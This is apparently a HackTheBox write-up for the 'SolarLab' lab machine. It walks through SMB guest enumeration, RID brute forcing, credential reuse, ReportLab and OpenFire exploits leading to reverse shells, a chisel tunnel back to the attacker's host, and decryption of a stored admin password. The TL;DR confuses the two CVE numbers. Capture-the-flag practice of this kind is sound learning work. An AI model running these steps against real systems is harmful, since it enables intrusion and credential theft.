# HTB – SolarLab
### TL;DR
This is a Windows 10 machine with a SMB share configured to allow guest sessions. In the shared resource we find usernames and passwords, and after a RID bruteforce we  get more usernames. A user shell is achieved exploiting CVE-2023-32315 in a Reportlab application running in the host. Regarding escalation, we move laterally exploiting CVE-2023-32315 in OpenFire, then decrypt the administrator password which is stored in the OpenFire database.
### KEYWORDS
SMB guest sessions, RID bruteforce, Reportlab, CVE-2023-32315, OpenFire, CVE-2023-3231.
### REFERENCES
https://github.com/c53elyas/CVE-2023-33733<br>
https://github.com/miko550/CVE-2023-32315<br>
https://hashcat.net/forum/thread-2399.html<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 11:05 EDT
Nmap scan report for 10.10.11.16
Host is up, received user-set (0.043s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
6791/tcp open  hnm          syn-ack

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p80,135,139,445,6791 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 11:06 EDT
Nmap scan report for 10.10.11.16
Host is up, received user-set (0.036s latency).
Scanned at 2024-05-12 11:06:54 EDT for 53s

PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack nginx 1.24.0
|_http-server-header: nginx/1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
6791/tcp open  http          syn-ack nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-12T15:07:16
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30723/tcp): CLEAN (Timeout)
|   Check 2 (port 64857/tcp): CLEAN (Timeout)
|   Check 3 (port 60230/udp): CLEAN (Timeout)
|   Check 4 (port 48381/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7s

Nmap done: 1 IP address (1 host up) scanned in 54.26 seconds
```
Take note of the disclosed subdomain, add to hosts file and continue enumerating. Next step is to check if the host accepts SMB null sessions.
```markdown
> smbmap -H solarlab.htb -u null -p null
[+] Guest session       IP: solarlab.htb:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Documents                                               READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
```
Enumerate the contents of the `Documents` folder.
```markdown
> smbclient \\\\solarlab.htb\\Documents -U=guest 
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

                7779839 blocks of size 4096. 1892766 blocks available
smb: \>
```
Download the `details-file.xlsx` file, it contains personal data and credentials.

![Untitled2](https://github.com/user-attachments/assets/ba13b1c5-efe8-40d1-93dd-42153961b972)

Since guests sessions are enabled, let's brute force the RID to get a list of valid usernames.
```markdown
> crackmapexec smb solarlab.htb -u guest -p '' --rid-brute
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10.0 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\guest: 
SMB         10.10.11.16     445    SOLARLAB         [+] Brute forcing RIDs
SMB         10.10.11.16     445    SOLARLAB         500: SOLARLAB\Administrator (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         501: SOLARLAB\Guest (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         503: SOLARLAB\DefaultAccount (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         504: SOLARLAB\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         513: SOLARLAB\None (SidTypeGroup)
SMB         10.10.11.16     445    SOLARLAB         1000: SOLARLAB\blake (SidTypeUser)
SMB         10.10.11.16     445    SOLARLAB         1001: SOLARLAB\openfire (SidTypeUser)
```
We have found user `SOLARLAB\blake`. If we see how usernames are formed in the `.xlsx` file, username should be `BlakeB`

### USER
Log in subdomain http://report.solarlab.htb:6791 with credentials `blakeb:ThisCanB3typedeasily1@`. A Reportlab welcome page appears.<br>
<br>
A CVE and a POC for Reportlab application are available here: https://github.com/c53elyas/CVE-2023-33733<br>
<br>
Click on "Travel Approval".

![Untitled3](https://github.com/user-attachments/assets/9c92aabf-94a5-4d09-87f9-6be79abd1e4f)

Generate request, upload a `.png` and capture with Burpsuite. Insert a payload after the `travel_request` parameter as indicated in the POC.

![Untitled](https://github.com/user-attachments/assets/261a6092-2410-4682-b2bd-adb22b9ec5d0)

Start a listener and send the request, a reverse shell is received. It can be used to retrieve the user flag.
### SYSTEM
Place a chisel to forward internal ports 9090 and 9091.<br>
<br>
In kali.
```markdown
./chisel64 server -p 8000 --reverse
```
In the reverse shell.
```markdown
.\chisel64.exe client <your_ip>:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
```
Navigate to http://localhost:9090, an OpenFire server pops up. Add a new user following instructions in: https://github.com/miko550/CVE-2023-32315<br>
<br>
Then upload a `.jar` plugin (taken from the same GitHub repository) to enable a command console. After uploading the plugin, navigate to Server -> Server Settings -> Management Tool, and select "System command". Insert a reverse shell, for example a powershell base64 encoded payload. A shell as user `openfire` is received on the listener.<br>
<br>
Unser this shell you can enumerate the file `C:\program files\openfire\embedded-db\openfire.script`. This file contains an encrypted OpenFire admin password.
```markdown
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
```
And a blowfish key which is needed to decrypt the key.
```markdown
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```
To decrypt the password you can use any of the OpenFire password decrypters available online, such as this: https://hashcat.net/forum/thread-2399.html<br>
<br>

![Untitled5](https://github.com/user-attachments/assets/309e6af8-f668-4907-8245-3bab2d450275)

Once you have the administrator password, just use it login as as system.

![Untitled6](https://github.com/user-attachments/assets/5db80520-74bf-4956-886c-4071a6193b41)

You are root.

